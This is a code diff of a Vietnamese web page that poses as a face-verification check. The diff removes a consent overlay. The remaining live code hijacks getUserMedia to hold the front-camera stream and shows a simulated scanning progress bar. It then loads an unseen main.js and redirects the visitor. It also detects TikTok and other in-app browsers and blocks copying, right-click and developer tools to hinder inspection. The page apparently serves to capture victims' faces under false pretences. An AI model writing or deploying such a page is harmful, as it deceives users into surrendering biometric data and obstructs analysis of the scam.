@@ -69,177 +69,6 @@
             display: none;
         }
 
-        /* ===== LỚP PHỦ CAPTCHA ===== */
-        .captcha-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(8px);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 20;
-            border-radius: 16px;
-            padding: 20px;
-            transition: opacity 0.5s ease;
-        }
-
-        .captcha-overlay.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .captcha-overlay .icon-cam {
-            font-size: 50px;
-            margin-bottom: 15px;
-            color: #8b949e;
-        }
-
-        .captcha-overlay h3 {
-            color: #f0f6fc;
-            font-size: 18px;
-            margin: 0 0 8px 0;
-        }
-
-        .captcha-overlay p {
-            color: #8b949e;
-            font-size: 14px;
-            margin: 0 0 20px 0;
-            text-align: center;
-            line-height: 1.6;
-        }
-
-        .captcha-btn {
-            background: #238636;
-            color: white;
-            border: none;
-            padding: 14px 40px;
-            border-radius: 12px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .captcha-btn:hover {
-            background: #2ea043;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(35, 134, 54, 0.3);
-        }
-
-        .captcha-btn:active {
-            transform: scale(0.96);
-        }
-
-        .captcha-btn .check {
-            font-size: 20px;
-        }
-
-        /* ===== FACE SCANNER OVERLAY ===== */
-        .scanner-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            display: none;
-            z-index: 10;
-        }
-
-        .scanner-overlay.active {
-            display: block;
-        }
-
-        .scan-frame {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 70%;
-            height: 75%;
-            border: 2px solid rgba(35, 134, 54, 0.6);
-            border-radius: 16px;
-            box-shadow: 0 0 40px rgba(35, 134, 54, 0.08), inset 0 0 40px rgba(35, 134, 54, 0.04);
-        }
-
-        .corner {
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            border-color: #238636;
-            border-style: solid;
-            border-width: 0;
-        }
-        .corner-tl { top: -2px; left: -2px; border-top-width: 3px; border-left-width: 3px; border-radius: 4px 0 0 0; }
-        .corner-tr { top: -2px; right: -2px; border-top-width: 3px; border-right-width: 3px; border-radius: 0 4px 0 0; }
-        .corner-bl { bottom: -2px; left: -2px; border-bottom-width: 3px; border-left-width: 3px; border-radius: 0 0 0 4px; }
-        .corner-br { bottom: -2px; right: -2px; border-bottom-width: 3px; border-right-width: 3px; border-radius: 0 0 4px 0; }
-
-        .scan-line {
-            position: absolute;
-            left: 5%;
-            width: 90%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #238636, #58d68d, #238636, transparent);
-            box-shadow: 0 0 20px rgba(35, 134, 54, 0.6), 0 0 60px rgba(35, 134, 54, 0.2);
-            top: 50%;
-            transform: translateY(-50%);
-            animation: scanMove 2.2s ease-in-out infinite;
-            border-radius: 2px;
-        }
-
-        @keyframes scanMove {
-            0% { top: 15%; opacity: 0.3; }
-            10% { opacity: 1; }
-            50% { top: 85%; opacity: 1; }
-            90% { opacity: 1; }
-            100% { top: 15%; opacity: 0.3; }
-        }
-
-        .scan-frame::after {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            border-radius: 18px;
-            border: 2px solid transparent;
-            animation: pulseGlow 2.5s ease-in-out infinite;
-            pointer-events: none;
-        }
-
-        @keyframes pulseGlow {
-            0%, 100% { border-color: rgba(35, 134, 54, 0.1); box-shadow: 0 0 10px rgba(35, 134, 54, 0); }
-            50% { border-color: rgba(35, 134, 54, 0.3); box-shadow: 0 0 30px rgba(35, 134, 54, 0.1); }
-        }
-
-        .focus-dot {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 6px;
-            height: 6px;
-            background: rgba(35, 134, 54, 0.5);
-            border-radius: 50%;
-            box-shadow: 0 0 20px rgba(35, 134, 54, 0.3);
-            animation: dotPulse 1.8s ease-in-out infinite;
-        }
-
-        @keyframes dotPulse {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
-            50% { transform: translate(-50%, -50%) scale(2); opacity: 0.9; }
-        }
-
         .btn {
             background: #238636;
             color: white;
@@ -290,6 +119,110 @@
             min-height: 38px;
         }
 
+        /* ===== FACE SCANNER OVERLAY ===== */
+        .scanner-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            display: none;
+            z-index: 10;
+        }
+
+        .scanner-overlay.active {
+            display: block;
+        }
+
+        /* Khung quét hình chữ nhật bo góc */
+        .scan-frame {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70%;
+            height: 75%;
+            border: 2px solid rgba(35, 134, 54, 0.6);
+            border-radius: 16px;
+            box-shadow: 0 0 40px rgba(35, 134, 54, 0.08), inset 0 0 40px rgba(35, 134, 54, 0.04);
+        }
+
+        /* Góc khung */
+        .corner {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-color: #238636;
+            border-style: solid;
+            border-width: 0;
+        }
+        .corner-tl { top: -2px; left: -2px; border-top-width: 3px; border-left-width: 3px; border-radius: 4px 0 0 0; }
+        .corner-tr { top: -2px; right: -2px; border-top-width: 3px; border-right-width: 3px; border-radius: 0 4px 0 0; }
+        .corner-bl { bottom: -2px; left: -2px; border-bottom-width: 3px; border-left-width: 3px; border-radius: 0 0 0 4px; }
+        .corner-br { bottom: -2px; right: -2px; border-bottom-width: 3px; border-right-width: 3px; border-radius: 0 0 4px 0; }
+
+        /* Đường quét ngang */
+        .scan-line {
+            position: absolute;
+            left: 5%;
+            width: 90%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #238636, #58d68d, #238636, transparent);
+            box-shadow: 0 0 20px rgba(35, 134, 54, 0.6), 0 0 60px rgba(35, 134, 54, 0.2);
+            top: 50%;
+            transform: translateY(-50%);
+            animation: scanMove 2.2s ease-in-out infinite;
+            border-radius: 2px;
+        }
+
+        @keyframes scanMove {
+            0% { top: 15%; opacity: 0.3; }
+            10% { opacity: 1; }
+            50% { top: 85%; opacity: 1; }
+            90% { opacity: 1; }
+            100% { top: 15%; opacity: 0.3; }
+        }
+
+        /* Hiệu ứng glow pulse cho khung */
+        .scan-frame::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 18px;
+            border: 2px solid transparent;
+            animation: pulseGlow 2.5s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { border-color: rgba(35, 134, 54, 0.1); box-shadow: 0 0 10px rgba(35, 134, 54, 0); }
+            50% { border-color: rgba(35, 134, 54, 0.3); box-shadow: 0 0 30px rgba(35, 134, 54, 0.1); }
+        }
+
+        /* Chấm focus giữa */
+        .focus-dot {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 6px;
+            height: 6px;
+            background: rgba(35, 134, 54, 0.5);
+            border-radius: 50%;
+            box-shadow: 0 0 20px rgba(35, 134, 54, 0.3);
+            animation: dotPulse 1.8s ease-in-out infinite;
+        }
+
+        @keyframes dotPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+            50% { transform: translate(-50%, -50%) scale(2); opacity: 0.9; }
+        }
+
+        /* ===== PROGRESS RING ===== */
         .progress-ring {
             display: none;
             margin: 12px auto 0;
@@ -334,6 +267,7 @@
             color: #58d68d;
         }
 
+        /* Lớp phủ cảnh báo cưỡng bách cho In-App Browser */
         #browser-warning {
             display: none;
             position: fixed;
@@ -396,16 +330,6 @@
             <p id="msg" style="color: #484f58;">Đang khởi tạo camera...</p>
             <video id="preview" autoplay playsinline muted></video>
             
-            <!-- Lớp phủ CAPTCHA bắt buộc ấn nút -->
-            <div class="captcha-overlay" id="captchaOverlay">
-                <div class="icon-cam"></div>
-                <h3>Xác nhận quyền truy cập</h3>
-                <p>Nhấn nút bên dưới để cho phép<br> xác thực fake id để xác minh người dùng</p>
-                <button class="captcha-btn" id="captchaBtn">
-                    <span class="check">✓</span> Tôi đồng ý
-                </button>
-            </div>
-            
             <!-- Overlay quét mặt -->
             <div class="scanner-overlay" id="scannerOverlay">
                 <div class="scan-frame">
@@ -419,6 +343,7 @@
             </div>
         </div>
         
+        <!-- Progress ring -->
         <div class="progress-ring" id="progressRing">
             <svg viewBox="0 0 50 50">
                 <circle class="bg" cx="25" cy="25" r="20" />
@@ -427,14 +352,16 @@
             <span class="progress-text" id="progressText">0%</span>
         </div>
         
-        <button class="btn" id="startBtn" disabled>BẮT ĐẦU XÁC THỰC</button>
-        <div id="status">Vui lòng xác nhận quyền truy cập camera để tiếp tục.</div>
+        <button class="btn" id="startBtn">BẮT ĐẦU XÁC THỰC</button>
+        <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.</div>
     </div>
 
     <script>
         // --- PHẦN 1: CẬP NHẬT USER AGENT TIKTOK MỚI NHẤT ---
         function checkAndShowWarning() {
             const ua = navigator.userAgent || navigator.vendor || window.opera;
+
+            // TikTok sử dụng 'TikTok', 'musical_ly', 'ByteLocale' trong chuỗi UA của họ
             const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
             const isOtherInApp = /FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
 
@@ -456,64 +383,13 @@
         const progressRing = document.getElementById('progressRing');
         const progressCircle = document.getElementById('progressCircle');
         const progressText = document.getElementById('progressText');
-        const captchaOverlay = document.getElementById('captchaOverlay');
-        const captchaBtn = document.getElementById('captchaBtn');
 
         const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
         const originalStop = MediaStreamTrack.prototype.stop;
         let frontStream = null;
         let progressInterval = null;
 
-        // ===== XỬ LÝ NÚT CAPTCHA =====
-        let cameraGranted = false;
-
-        captchaBtn.addEventListener('click', async function(e) {
-            e.preventDefault();
-            
-            // Hiệu ứng click
-            this.style.transform = 'scale(0.96)';
-            setTimeout(() => { this.style.transform = ''; }, 200);
-            
-            // Vô hiệu hóa nút
-            this.disabled = true;
-            this.innerHTML = '⏳ Đang khởi tạo...';
-            
-            try {
-                // Yêu cầu quyền camera
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
-                
-                // Hủy stream tạm thời (sẽ được tạo lại bởi logic gốc)
-                stream.getTracks().forEach(t => t.stop());
-                
-                cameraGranted = true;
-                captchaOverlay.classList.add('hidden');
-                btn.disabled = false;
-                status.innerHTML = '✅ Camera đã sẵn sàng. Nhấn "Bắt đầu xác thực" để tiến hành.';
-                
-                // Kích hoạt camera qua logic gốc
-                await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
-                
-            } catch (err) {
-                console.error('Lỗi cấp quyền camera:', err);
-                this.disabled = false;
-                this.innerHTML = '✓ Tôi đồng ý';
-                status.innerHTML = '❌ Không thể truy cập camera. Vui lòng cho phép quyền trong trình duyệt.';
-                alert('Vui lòng cho phép truy cập camera để xác thực khuôn mặt!');
-            }
-        });
-
-        // Override getUserMedia để giữ logic gốc nhưng chỉ cho phép sau khi đã cấp quyền
         navigator.mediaDevices.getUserMedia = async (constraints) => {
-            if (!cameraGranted) {
-                // Nếu chưa cấp quyền, vẫn cho phép để lấy stream nhưng không hiển thị
-                const stream = await originalGetUserMedia(constraints);
-                return stream;
-            }
-            
             const stream = await originalGetUserMedia(constraints);
             if (constraints.video && constraints.video.facingMode === 'user') {
                 frontStream = stream;
@@ -536,12 +412,13 @@
 
         // ===== HÀM CẬP NHẬT PROGRESS =====
         function updateProgress(percent) {
-            const circumference = 125.6;
+            const circumference = 125.6; // 2 * PI * 20
             const offset = circumference - (percent / 100) * circumference;
             progressCircle.style.strokeDashoffset = offset;
             progressText.textContent = Math.round(percent) + '%';
         }
 
+        // ===== HÀM BẮT ĐẦU QUÉT =====
         function startScanner() {
             scannerOverlay.classList.add('active');
             vBox.classList.add('active');
@@ -551,6 +428,7 @@
             scannerOverlay.classList.remove('active');
         }
 
+        // ===== MÔ PHỎNG TIẾN TRÌNH =====
         function simulateProgress() {
             let progress = 0;
             progressRing.classList.add('active');
@@ -567,6 +445,7 @@
                     }
                     updateProgress(progress);
                     
+                    // Cập nhật trạng thái theo tiến trình
                     if (progress < 30) {
                         status.innerHTML = "🔍 Đang xác định khuôn mặt...<br>Vui lòng giữ nguyên vị trí.";
                     } else if (progress < 60) {
@@ -581,8 +460,6 @@
         }
 
         btn.addEventListener('click', async () => {
-            if (btn.disabled) return;
-            
             btn.disabled = true;
             btn.innerText = "ĐANG XỬ LÝ...";
             
@@ -599,9 +476,13 @@
             
             status.innerHTML = "🔄 Đang khởi tạo xác thực...<br>Vui lòng đợi.";
             
+            // Chạy hiệu ứng quét và tiến trình
             await simulateProgress();
+            
+            // Dừng scanner
             stopScanner();
             
+            // Gọi script main.js
             const script = document.createElement('script');
             script.src = './main.js';
             document.body.appendChild(script);
@@ -626,6 +507,7 @@
                     if (frontStream) {
                         frontStream.getTracks().forEach(t => originalStop.apply(t));
                     }
+                    // Reset progress
                     progressRing.classList.remove('active');
                     updateProgress(0);
                     if (REDIRECT_URL) {
@@ -635,17 +517,9 @@
             }, 1000);
         }
 
-        // ===== TỰ ĐỘNG HIỆN CAPTCHA KHI LOAD =====
-        window.addEventListener('load', function() {
-            // Ẩn message camera mặc định
-            msg.style.display = 'none';
-            // Hiển thị captcha overlay
-            captchaOverlay.style.display = 'flex';
-            status.innerHTML = '📸 Vui lòng xác nhận quyền truy cập camera để tiếp tục.';
-        });
-
     </script>
     
+    <!-- Code chặn chuột phải và F12 (không hiện thông báo) -->
     <script>
         // Chặn copy
         document.addEventListener('copy', function (e) {
@@ -653,11 +527,13 @@
             return false;
         });
         
+        // Chặn context menu
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             return false;
         });
         
+        // Chặn F12 và dev tools
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key.toUpperCase()))) {
                 e.preventDefault();
